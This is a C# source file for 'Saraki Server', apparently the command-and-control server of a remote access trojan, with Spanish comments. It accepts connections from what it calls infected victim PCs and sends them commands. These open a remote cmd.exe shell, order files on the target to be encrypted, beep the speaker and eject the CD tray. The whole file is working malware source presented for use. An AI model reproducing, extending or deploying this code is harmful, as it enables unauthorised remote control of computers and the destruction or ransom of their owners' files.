using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;


namespace Saraki_Server
{
    class Server_Saraki
    {
        //Dirección IP y Puerto
        private static IPAddress address_ip;
        private static int port;

        //Hilo para la ejecución del servidor
        private static Thread hilo_server;

        //Hilo para el envio de comandos hacia el proceso cmd.exe
        private static Thread hilo_cmd;
     
        //Representa una pc de la lista
        private static int pc = 0;

        //Comandos del server(Ordenes para que la pc cliente realice una tarea)
        private static string[] comandos_server = { "sk", "-h", "-lpc", "-q", "-ocd", "-ccd", "-b", "-cmd","-enc" };
        private static string[] comandos_send_to_clients = { "OPEN-CD", "CLOSE-CD", "BEEP", "SHUTDOWN", "CMD", "QUIT_CMD","ENCRYPT"};

        //Comandos respuestas del cliente al servidor
        private static string[] comandos_response_of_client = { "END_EXECUTE_COMMAND", "NOT_EXECUTE_COMMAND"};

        //Almacena las direcciones IP de las PC conectadas al servidor
        private static List<String> IP_PC_Victims = new List<string>();

        //Lista para almacenar todas las PC conectadas al servidor.
        private static List<TcpClient> MyClients = new List<TcpClient>();

        //Representa la conexión de un servidor que está a la espera de conexiones.
        private static TcpListener MyServer;

        //My String Vacio
        private static string mystringclean { get; } = "";

        //My Bool True
        private static bool mytrue { get; } = true;

        //My Bool True
        private static bool myfalse { get; } = false;

        private static StreamWriter streamWriter;
        private static StreamReader streamReader;

        //Iniciar Servidor Saraki
        static private void begin_server()
        {
            Console.WriteLine("Iniciando servidor...");
            MyServer = new TcpListener(address_ip, port);
            //Comienza la escucha de solicitudes de conexion,el máximo de conexiones permitidas es 30;
            MyServer.Start(30);
            Console.WriteLine("Servidor iniciado y en escucha...");
            //Se mantiene ejecutado el server a la espera de más conexiones y para enviar ordenes a las pc infectadas.
            while (true)
            {
                //Acepta la conexión entrante y obtiene los datos de la conexión con la pc victima actual.
                TcpClient new_pc_victim = MyServer.AcceptTcpClient();
                //Almacena en una lista los datos de conexión(IP) de las PC infectadas.
                MyClients.Add(new_pc_victim);
                Console.WriteLine("***********************************************************************************");
                //Obtenemos la dirección IP y el puerto de la PC victima.
                var data_conection = new_pc_victim.Client.RemoteEndPoint.ToString();
                Console.WriteLine($"Se ha conectado una pc: {data_conection}");
                //Almacenamos en una lista los datos(ip-port) de la conexión con la PC.
                IP_PC_Victims.Add(data_conection);
                //Ejecución de comandos
                for (; ; )
                {
                    Console.Write("/>:");
                    if (execute_command(Console.ReadLine()) == comandos_server[3])
                    {
                        MyServer.Stop(); //Cierra el servidor(Libera la conexión)
                        return;
                    }
                }
            }
        }

        //Encriptar flujo de datos salientes
    
        //Mostrar ayuda de comandos
        static private void help(string command)
        {
            //Ayuda
            if(command == comandos_server[1])
            {
               Console.WriteLine();
               Console.WriteLine("Muestra la ayuda general.");
               Console.WriteLine("sk -h");
               Console.WriteLine();
               Console.WriteLine("Acepta las conexiones entrantes pendientes.");
               Console.WriteLine("sk -lpc");
               Console.WriteLine();
               Console.WriteLine("Cierra el servidor.");
               Console.WriteLine("sk -q");
               Console.WriteLine();
               Console.WriteLine("Abre la torre de CD de la PC seleccionada.");
               Console.WriteLine("sk -ocd");
               Console.WriteLine();
               Console.WriteLine("Cierra la torre de CD de la PC seleccionada.");
               Console.WriteLine("sk -ccd");
               Console.WriteLine();
               Console.WriteLine("Emite sonidos en la pc objetivo utilizando.");
               Console.WriteLine("sk -b <tiempo(ms)> <frequencia(Hz)>");
               Console.WriteLine("El rango de frecuencia es de 37Hz a 32767Hz");
               Console.WriteLine("Ejemplo de uso: sk -b 3000 12: Emite un sonido en la PC de 3 segundos a 12Hz.");
               Console.WriteLine();
               Console.WriteLine("Ejecuta la consola de windows de la pc infectada.");
               Console.WriteLine("sk -cmd");
               Console.WriteLine();
               Console.WriteLine("Encripta archivos en la PC objetivo.");
               Console.WriteLine("sk -enc");
               Console.WriteLine();
               return;
            }
        }

        //Verificar si hay nuevas solicitudes de conexión pendientes.
        static private bool pending_connection()
        {
           //Verifica si hay conexiones pendientes
           if(MyServer.Pending())
           {
              //Acepta la conexión entrante y obtiene los datos de la conexión con la pc victima actual.
              var pc = MyServer.AcceptTcpClient();
              var new_pc_victim = pc.Client.RemoteEndPoint.ToString();
              //Almacena en una lista los datos de conexión(IP) de las PC infectadas.
              IP_PC_Victims.Add(new_pc_victim);
              MyClients.Add(pc);
           }
           if(MyClients.Count() > 0)
           { 
              //Muestra la lista de PC conectadas al servidor.
              int i=0;
              foreach (string pc_victims in IP_PC_Victims)
              { 
                 Console.WriteLine($"{i} --- PC conectada: {pc_victims}");
                 i++;
              }
              Console.WriteLine();
              return mytrue;
           }
           else
           Console.WriteLine("No hay PC conectadas al servidor.");
           Console.WriteLine();
           return myfalse;
        }      

        //Enviar comandos a una PC objetivo.
        static private bool send_command(TcpClient tcpClient, string command)
        {
            try
            {
                //Crea un flujo para escribir datos hacia la pc objetivo.
                //GetStream crea un flujo del tipo NetworkStream que sirve para enviar y recibir datos
                StreamWriter send_pc_victim = new StreamWriter(tcpClient.GetStream());
                //Encripta los datos antes de enviarlos
                //Envia los datos a la pc objetivo
                send_pc_victim.WriteLine(command);
                //Limpiamos el buffer
                send_pc_victim.Flush();
                //Espera por respuesta del servidor.
                if(!recive_data_pc(tcpClient))
                return myfalse;
            }
            catch
            {
               //Elimina a la PC de lista de PC conectadas.
               MyClients.Remove(tcpClient);
               IP_PC_Victims.Remove(tcpClient.Client.RemoteEndPoint.ToString());
               Console.WriteLine("Se ha perdido la conexión con la PC objetivo.");
               Console.WriteLine();
               return myfalse;
            }
            return mytrue;
        }

        //Recibir información de la ejecución del comando.
        static private bool recive_data_pc(TcpClient tcpClient)
        {
            try
            {
               //Crea un flujo para leer los datos desde una PC
               StreamReader recive_pc = new StreamReader(tcpClient.GetStream());     
               //Se mantiene recibiendo datos del cliente hasta que llegue la orden 
               string data=mystringclean;
               for(;;)
               {
                  data = recive_pc.ReadLine();
                  //Recibe el comando que indica que el comando se ejecuto correctamente.
                  if(data == comandos_response_of_client[0])
                  { 
                     Console.WriteLine("!!!Exito.!!!");
                     Console.WriteLine();
                     break;
                  }
                  //Recibe el comando que indica que el comando no se ejecuto correctamente.
                  else if(data == comandos_response_of_client[1])
                  { 
                     Console.WriteLine("!!!No se pudo ejecutar el comando.!!!");
                     Console.WriteLine();
                     break;
                  }
                  //El la PC se ha desconectado del servidor.
                  else if(data == null)
                  {
                     //Elimina a la PC de lista de PC conectadas.
                     MyClients.Remove(tcpClient);
                     IP_PC_Victims.Remove(tcpClient.Client.RemoteEndPoint.ToString());
                     Console.WriteLine("Se ha perdido la conexión con la PC objetivo.");
                     Console.WriteLine();
                     return myfalse;
                  }
                  //Imprime en pantalla los datos recividos
                  Console.WriteLine(data);
               }
            }
            catch
            {
               //Elimina a la PC de lista de PC conectadas.
               MyClients.Remove(tcpClient);
               IP_PC_Victims.Remove(tcpClient.Client.RemoteEndPoint.ToString());
               Console.WriteLine("Se ha perdido la conexión con la PC objetivo.");
               Console.WriteLine();
               return myfalse;
            }
            return mytrue;
        }

        //Selecciona una PC para enviar algún tipo de comando
        static private int select_pc()
        {
           if(!pending_connection())
           return -1;
           Console.Write("Seleccione la PC: ");
           int pc;
           try
           {
              pc = int.Parse(Console.ReadLine());
              if (pc > MyClients.Count() || pc < 0 || MyClients.Count() == 0 || (MyClients.Count() == 1 && pc == 1))
              {
                 Console.WriteLine("Ese número no está en el rango de las PC mostrada en la lista.Seleccione un número de la lista.");
                 Console.WriteLine();
                 return -1;
              }
           }
           catch
           {
              Console.WriteLine("Seleccione el número de la PC objetivo.");
              Console.WriteLine();
              return -1;
           }
           return pc;
        }

        //Error
        static private string error()
        {
           Console.WriteLine("Escriba sk -h para ver la ayuda disponible.");
           Console.WriteLine();
           return "";
        }

        //Ejecutar Comandos
        static string execute_command(string command)
        {
           //Convierte de string a string[] para obtener los comandos.
           var list_commands = command.Split();
           //Verifica que el comando sea correcto.
           if (list_commands == null || list_commands.Length <= 0)
           { 
              Console.WriteLine("Escriba help para obtener los comandos disponibles.");
              Console.WriteLine("Para ver la ayuda de un comando escriba: <help> <nombre_comando>");
              return mystringclean;
           }
           //2 Argumentos
           else if(list_commands.Length == 2) 
           {
              //Muestra la ayuda disponible
              if (list_commands[0] == comandos_server[0] && list_commands[1] == comandos_server[1])
              help(comandos_server[1]);
              //Acepta las conexiones pendientes y muestra las pc que se conectaron al server.
              else if (list_commands[0] == comandos_server[0] && list_commands[1] == comandos_server[2])
              pending_connection();
              //Cierra el servidor
              else if (list_commands[0] == comandos_server[0] && list_commands[1] == comandos_server[3])
              return comandos_server[3];
              //Manda a abrir o a cerrar la torre de CD de la PC objetivo
              else if (list_commands[0] == comandos_server[0] && (list_commands[1] == comandos_server[4] || list_commands[1] == comandos_server[5]))
              { 
                 try
                 { 
                    //Selecciona la PC deseada
                    pc = select_pc();
                    if(pc == -1)
                    return mystringclean;
                    Console.WriteLine();
                    //Manda a abrir Torre de CD de la PC objetivo
                    if (list_commands[1] == comandos_server[4])
                    send_command(MyClients[pc],comandos_send_to_clients[0]);
                    //Manda a cerrar la Torre de CD de la PC objetivo
                    else
                    send_command(MyClients[pc],comandos_send_to_clients[1]);
                 }
                 catch(Exception ex)
                 { 
                   Console.WriteLine(ex.Message.ToString());;
                   Console.WriteLine();
                   return mystringclean;
                 }
              }
              //Manda a ejecutar la consola de windows de la PC objetivo
              else if (list_commands[0] == comandos_server[0] && list_commands[1] == comandos_server[7])
              {
                 try
                 { 
                    //Selecciona la PC deseada
                    pc = select_pc();
                    if (pc == -1)
                    return mystringclean;    
                    StringBuilder stringBuilder = new StringBuilder();
                    Console.WriteLine();
                    //Crea un hilo para el envio de comandos al proceso cmd.exe,
                    hilo_cmd = new Thread(send_comands_cmd);
                    streamWriter = new StreamWriter(MyClients[pc].GetStream());
                    streamReader = new StreamReader(MyClients[pc].GetStream());
                    //Envia el comando para la ejecución del proceso cmd.exe
                    stringBuilder.Append(comandos_send_to_clients[4]);
                    streamWriter.WriteLine(stringBuilder.ToString());
                    streamWriter.Flush(); 
                    //Ejecuta el hilo
                    hilo_cmd.Start();
                    while(true)
                    {
                       var message = streamReader.ReadLine();
                       if (message == comandos_response_of_client[0])
                       {
                          streamWriter.Flush();
                          hilo_cmd.Abort();
                          break;     
                       }     
                       else
                       Console.WriteLine(message);
                    }
                 }
                 catch(ThreadAbortException)
                 { 
                    Console.WriteLine();
                    return mystringclean;
                 }
                 catch(Exception ex)
                 {
                    Console.WriteLine(ex.Message.ToString());;
                    Console.WriteLine();
                    return mystringclean;
                 }
              }
              //No se reconoce el comando
              else
              return error();
           }
           //3 Argumentos
           else if(list_commands.Length == 3)
           {
                //Manda a encriptar archivos en la PC objetivo
                if (list_commands[0] == comandos_server[0] && list_commands[1] == comandos_server[8])
                {
                    try
                    {
                        //Selecciona la PC deseada
                        pc = select_pc();
                        if (pc == -1)
                        return mystringclean;
                        Console.WriteLine();
                        send_command(MyClients[pc], $"{comandos_send_to_clients[6]} {list_commands[2]}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message.ToString()); ;
                        Console.WriteLine();
                        return mystringclean;
                    }
                }
           }
           //4 Argumentos
           else if(list_commands.Length == 4)
           { 
             //Manda a emitir sonidos en la PC objetivo
             if(list_commands[0] == comandos_server[0] && list_commands[1] == comandos_server[6])
             { 
                int frequency;
                int time;
                //Parsea el valor de la frecuencia
                try
                { 
                   frequency = int.Parse(list_commands[2]);
                }
                catch
                { 
                   Console.WriteLine("El formato de la frecuencia no es correcto.");
                   Console.WriteLine();
                   return mystringclean;
                }
                //Parsea el valor del tiempo
                try
                { 
                   time = int.Parse(list_commands[3]);
                }
                catch
                { 
                   Console.WriteLine("El formato del tiempo no es correcto.");
                   Console.WriteLine();
                   return mystringclean;
                }
                //Verifica el rango de la frecuencia.
                if(frequency < 37 || frequency > 32767)
                { 
                   Console.WriteLine("El rango de la frecuencia es incorrecto. La frecuencia debe estar entre 37Hz a 32767Hz");
                   Console.WriteLine();
                   return mystringclean;
                }
                //Selecciona la PC deseada
                pc = select_pc();
                if(pc == -1)
                return mystringclean;
                Console.WriteLine();
                //Crea el comando más los argumentos.
                string comando = $"{comandos_send_to_clients[2]} {frequency} {time}";
                //Envia el comando de emitir sonido más los valores de frecuencia y tiempo.
                send_command(MyClients[pc], comando);
             }
           }
           //Comando no reconocido
           else
           return error();
           return mystringclean;
        }

        //Envia comandos para la ejecución del proceso cmd.exe
        static void send_comands_cmd()
        {
           streamWriter = new StreamWriter(MyClients[pc].GetStream());
           StringBuilder stringBuilder = new StringBuilder();
           while (true)
           {
              stringBuilder.Append(Console.ReadLine());
              if (stringBuilder.ToString() == "exit")
              { 
                 stringBuilder.Remove(0,stringBuilder.Length);
                 streamWriter.WriteLine(stringBuilder.Append(comandos_send_to_clients[5]));
                 streamWriter.Flush();
                 Console.WriteLine();
                 break;
              }
              else
              { 
                 streamWriter.WriteLine(stringBuilder);
                 stringBuilder.Remove(0,stringBuilder.Length);
                 streamWriter.WriteLine(stringBuilder);
                 streamWriter.Flush();
              }
           }
        }

        //Main
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Title = "Saraki Server V1.0";
            hilo_server = new Thread(begin_server);
            Console.WriteLine("Saraki V1.0.");
            Console.Write("Escriba la dirección ip que desea darle al servidor: ");
            string ip = Console.ReadLine();
            /*Verifica que la dirección ip este correcta*/
            try
            {
                address_ip = IPAddress.Parse(ip); //Permite utilizar el protocolo IP(Por defecto usa TCP)
            }
            catch
            {
                Console.WriteLine("El formato de la dirección ip no es correcta.");
                Console.ReadLine();
                return;
            }
            /*Verifica que el puerto es correcto y que no este abierto.*/
            Console.Write("Escriba el puerto por el que funcionará el servidor: ");
            string server_port = Console.ReadLine();
            try
            {
                //Verifica que el puerto es correcto.
                port = int.Parse(server_port);
                if (port < 0 || port > 65536)
                Console.WriteLine("El rango de puertos es de 0-65536.");
            }
            catch
            {
                Console.WriteLine("El valor del puerto no es correcto.");
                Console.ReadLine();
                return;
            }
            /*Inicia el servidor Saraki*/
            try
            {
              hilo_server = new Thread(begin_server);
              hilo_server.Start();
            }
            catch
            {
                Console.WriteLine("Error iniciando el servidor.");
                Console.ReadLine();
                return;
            }
        }
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    }
}
